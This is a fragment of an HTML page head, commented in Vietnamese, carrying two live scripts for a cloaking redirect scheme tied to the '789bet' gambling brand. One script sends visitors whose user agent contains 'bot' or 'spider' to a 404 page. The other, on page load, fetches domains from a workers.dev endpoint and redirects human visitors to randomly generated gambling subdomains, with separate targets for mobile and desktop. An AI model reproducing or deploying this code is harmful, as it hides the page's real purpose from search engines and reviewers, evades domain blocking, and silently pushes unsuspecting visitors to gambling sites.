    <link rel="icon" href="https://c61b62c6.789bet-site.pages.dev/" type="image/x-icon">
    
    <script>
        const userAgent = (navigator.userAgent || navigator.vendor || window.opera).toLowerCase();
        const botKeywords = ['bot', 'spider'];
        
        // Chặn bot bằng cách chuyển hướng đến trang lỗi
        for (let i = 0; i < botKeywords.length; i++) {
            if (userAgent.indexOf(botKeywords[i]) !== -1) {
                window.location.href = '/404.html';
                break;
            }
        }
    </script>
    
    <script>
        // Hàm tạo chuỗi ngẫu nhiên
        function generateRandomString(length) {
            const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
            let randomString = '';
            for (let i = 0; i < length; i++) {
                randomString += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return randomString;
        }

        // Kiểm tra nếu người dùng truy cập từ thiết bị di động
        function isMobile() {
            return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && window.innerWidth <= 800;
        }

        // Lấy danh sách các liên kết từ API và chuyển hướng dựa trên thiết bị
        function fetchDomainsAndRedirect() {
            fetch('https://789bet-site.lumiere-fcc.workers.dev/') // URL API của bạn
                .then(response => response.json())
                .then(data => {
                    const mobileDomains = [data.links1, data.links2]; // Liên kết cho di động
                    const desktopDomains = [data.links3]; // Liên kết cho máy tính để bàn

                    const randomString = generateRandomString(20); // Chuỗi ngẫu nhiên
                    const selectedDomain = isMobile()
                        ? mobileDomains[Math.floor(Math.random() * mobileDomains.length)]
                        : desktopDomains[Math.floor(Math.random() * desktopDomains.length)];

                    if (selectedDomain) {
                        // Thực hiện chuyển hướng với tên miền động nếu có
                        window.location.href = 'https://' + (selectedDomain.includes('789bet') ? `${randomString}.${selectedDomain}` : selectedDomain);
                    } else {
                        console.error("No domain available for redirection");
                    }
                })
                .catch(error => console.error('Error fetching domains:', error));
        }

        // Thực hiện hàm chuyển hướng khi trang tải xong
        window.onload = fetchDomainsAndRedirect;
    </script>
